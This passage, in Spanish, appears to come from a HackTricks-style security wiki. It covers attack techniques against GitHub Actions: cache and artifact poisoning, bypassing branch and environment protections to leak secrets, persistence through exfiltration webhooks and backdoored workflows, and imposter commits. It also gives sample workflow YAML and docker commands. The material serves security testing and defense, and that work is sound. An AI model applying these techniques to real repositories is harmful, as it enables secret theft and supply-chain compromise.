Utilizamos un ejemplo de CI que inclu铆a dos flujos de trabajo. Este ejemplo muestra c贸mo un ataque puede pasar de un flujo de trabajo de baja permisos a uno de alta permisos.

* Flujo de trabajo de **prueba unitaria** que ejecuta pruebas unitarias y herramientas de cobertura de c贸digo. Suponemos que una de las herramientas es maliciosa o vulnerable a la ejecuci贸n remota de c贸digo. El flujo de trabajo no necesita utilizar la acci贸n de Git **action/cache**. Cualquier flujo de trabajo puede acceder a la cach茅.
* Flujo de trabajo de **lanzamiento** que construye y lanza el artefacto de la aplicaci贸n. Este flujo de trabajo utiliza una cach茅 para optimizar el uso de las dependencias de Golang.

El flujo de trabajo de **prueba unitaria** utiliza una acci贸n maliciosa que agrega una entrada de cach茅 con contenido malicioso al cambiar una biblioteca de registro de Golang (**go.uber.org/zap@v1**) para agregar la cadena 'BAD library' a la descripci贸n del artefacto de la aplicaci贸n.

A continuaci贸n, el flujo de trabajo de **lanzamiento** utiliza esta entrada de cach茅 envenenada. Como resultado, el c贸digo malicioso se inyecta en el binario y la imagen de Golang construidos. La cach茅 permanece envenenada hasta que se descarta la clave de entrada (generalmente desencadenada por actualizaciones de dependencias). La misma cach茅 envenenada afectar谩 a cualquier otro **flujo de trabajo**, **ejecuci贸n** y **rama secundaria** que utilice la misma clave de cach茅.

En la prueba que realizamos, logramos inyectar la cadena 'BAD library' en la descripci贸n de la imagen:

![BAD library](https://scribesecurity.com/wp-content/uploads/2022/02/BAD-library-2-300x79.jpg)

Esto fue en la versi贸n 0.4.1. A continuaci贸n, actualizamos la etiqueta y reconstruimos la imagen varias veces, y observamos que 'Bad library' permaneci贸 en la descripci贸n.

Esta t茅cnica se tom贸 de [https://scribesecurity.com/blog/github-cache-poisoning/](https://scribesecurity.com/blog/github-cache-poisoning/)

### Envenenamiento de artefactos

Existen varias Acciones de Github que permiten **descargar artefactos de otros repositorios**. Estos otros repositorios generalmente tendr谩n una Acci贸n de Github para **subir el artefacto** que luego se descargar谩.

Si la **Acci贸n de Github** del repositorio que carga el artefacto permite el uso de **`pull_request`** o **`pull_request_target`** (usando el c贸digo del atacante), un atacante podr谩 activar la Acci贸n que cargar谩 un Artefacto creado a partir de su c贸digo, por lo que cualquier otro repositorio que descargue y ejecute el 煤ltimo artefacto quedar谩 comprometido.

{% hint style="info" %}
Como se mencion贸 en una secci贸n de esta publicaci贸n, **`pull_requests`** generalmente requerir谩 una **aprobaci贸n manual** de un mantenedor del repositorio.
{% endhint %}

Ejemplo de **descarga de artefacto desde un repositorio diferente**:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Como se mencion贸 anteriormente, en un desencadenador de **`pull_request`**, la Acci贸n definida en la PR es la que se ejecuta. Por lo tanto, un **atacante** podr铆a **definir** all铆 la **carga del artefacto** que le gustar铆a comprometer.

Por lo tanto, un atacante no necesita atacar un desencadenador de **`pull_request`** en la acci贸n de carga del artefacto, sino simplemente cualquier desencadenador de **`pull_request`**.
{% endhint %}

Para obtener m谩s informaci贸n y opciones de defensa (como codificar en duro el artefacto a descargar), consulta [https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust](https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust)
### Secuestro de repositorio de espacio de nombres eliminado

Este es un buen art铆culo para leer sobre vulnerabilidades corregidas que permitir铆an a un atacante robar un espacio de nombres eliminado para robar un repositorio famoso (potencialmente debido a un cambio de nombre del espacio de nombres): [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

### Registro de im谩genes Docker de Github

Es posible crear acciones de Github que **compilen y almacenen una imagen Docker dentro de Github**.\
Un ejemplo se puede encontrar en el siguiente desplegable:

<details>

<summary>Acci贸n de Github para compilar y enviar una imagen Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como pudiste ver en el c贸digo anterior, el registro de Github est谩 alojado en **`ghcr.io`**.

Un usuario con permisos de lectura sobre el repositorio podr谩 descargar la imagen de Docker utilizando un token de acceso personal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
A continuaci贸n, el usuario podr铆a buscar **secretos filtrados en las capas de la imagen Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

## Bypass de Protecci贸n de Ramas

* **Requerir un n煤mero de aprobaciones**: Si comprometes varias cuentas, puedes aceptar tus PR desde otras cuentas. Si solo tienes acceso a la cuenta desde la cual creaste el PR, no puedes aceptar tu propio PR. Sin embargo, si tienes acceso a un entorno de **Github Action** dentro del repositorio, utilizando el **GITHUB\_TOKEN**, es posible que puedas **aprobar tu PR** y obtener una aprobaci贸n de esta manera.
* _Nota para esto y para la restricci贸n de propietarios de c贸digo, por lo general, un usuario no podr谩 aprobar sus propios PR, pero si puedes hacerlo, puedes abusar de ello para aceptar tus PR._
* **Descartar aprobaciones cuando se env铆an nuevos commits**: Si esto no est谩 configurado, puedes enviar c贸digo leg铆timo, esperar a que alguien lo apruebe y luego agregar c贸digo malicioso y fusionarlo en la rama protegida.
* **Requerir revisiones de los propietarios de c贸digo**: Si esto est谩 activado y eres un propietario de c贸digo, puedes hacer que una **Github Action cree tu PR y luego aprobarlo t煤 mismo**.
* Cuando un archivo **CODEOWNER est谩 mal configurado**, Github no se queja pero no lo utiliza. Por lo tanto, si est谩 mal configurado, **no se aplica la protecci贸n de propietarios de c贸digo**.
* **Permitir que actores especificados eviten los requisitos de pull request**: Si eres uno de estos actores, puedes evitar las protecciones de pull request.
* **Incluir administradores**: Si esto no est谩 configurado y eres administrador del repositorio, puedes evitar estas protecciones de rama.
* **Secuestro de PR**: Podr铆as ser capaz de **modificar el PR de otra persona** agregando c贸digo malicioso, aprobando el PR resultante t煤 mismo y fusionando todo.
* **Eliminar protecciones de rama**: Si eres un **administrador del repositorio, puedes desactivar las protecciones**, fusionar tu PR y volver a configurar las protecciones.
* **Bypass de protecciones de push**: Si un repositorio **solo permite que ciertos usuarios** env铆en push (fusionar c贸digo) en las ramas (la protecci贸n de la rama podr铆a estar protegiendo todas las ramas especificando el comod铆n `*`).
* Si tienes **acceso de escritura al repositorio pero no se te permite enviar c贸digo** debido a la protecci贸n de la rama, a煤n puedes **crear una nueva rama** y dentro de ella crear una **github action que se active cuando se env铆a c贸digo**. Como la **protecci贸n de la rama no proteger谩 la rama hasta que se cree**, este primer env铆o de c贸digo a la rama **ejecutar谩 la github action**.

## Bypass de Protecciones de Entornos

Para obtener una introducci贸n sobre [**Github Environment, consulta la informaci贸n b谩sica**](basic-github-information.md#git-environments).

En caso de que se pueda **acceder a un entorno desde todas las ramas**, no est谩 **protegido** y puedes acceder f谩cilmente a los secretos dentro del entorno. Ten en cuenta que es posible que encuentres repositorios donde **todas las ramas est茅n protegidas** (especificando sus nombres o utilizando `*`), en ese escenario, **encuentra una rama en la que puedas enviar c贸digo** y puedes **filtrar** los secretos creando una nueva github action (o modificando una existente).

Ten en cuenta que es posible que encuentres el caso extremo donde **todas las ramas est茅n protegidas** (mediante el comod铆n `*`) y se especifique **qui茅n puede enviar c贸digo a las ramas** (_puedes especificarlo en la protecci贸n de la rama_) y **tu usuario no est谩 permitido**. A煤n puedes ejecutar una github action personalizada porque puedes crear una rama y usar el disparador de env铆o sobre s铆 misma. La **protecci贸n de la rama permite el env铆o a una nueva rama, por lo que se activar谩 la github action**.
```yaml
push: # Run it when a push is made to a branch
branches:
- current_branch_name #Use '**' to run when a push is made to any branch
```
Ten en cuenta que **despu茅s de la creaci贸n** de la rama, la **protecci贸n de la rama se aplicar谩 a la nueva rama** y no podr谩s modificarla, pero para ese momento ya habr谩s filtrado las contrase帽as.

## Persistencia

* Generar un **token de usuario**
* Robar **tokens de Github** de los **secretos**
* **Eliminar** los **resultados** y las **ramas** del flujo de trabajo
* Dar **m谩s permisos a toda la organizaci贸n**
* Crear **webhooks** para exfiltrar informaci贸n
* Invitar a **colaboradores externos**
* **Eliminar** los **webhooks** utilizados por el **SIEM**
* Crear/modificar una **Acci贸n de Github** con una **puerta trasera**
* Encontrar una **Acci贸n de Github vulnerable a la inyecci贸n de comandos** mediante la modificaci贸n del valor del **secreto**

### Commits de impostores - Puerta trasera a trav茅s de commits del repositorio

En Github es posible **crear una solicitud de extracci贸n (PR) a un repositorio desde un fork**. Incluso si la PR no es **aceptada**, se crear谩 un identificador de **commit** en el repositorio original para la versi贸n del c贸digo del fork. Por lo tanto, un atacante **podr铆a fijarse en utilizar un commit espec铆fico de un repositorio aparentemente leg铆timo que no fue creado por el propietario del repositorio**.

Como [**este**](https://github.com/actions/checkout/commit/c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e):
```yaml
name: example
on: [push]
jobs:
commit:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e
- shell: bash
run: |
echo 'hello world!'
```
Para obtener m谩s informaci贸n, consulta [https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd](https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd)

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si deseas ver tu **empresa anunciada en HackTricks** o si deseas acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop).
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>
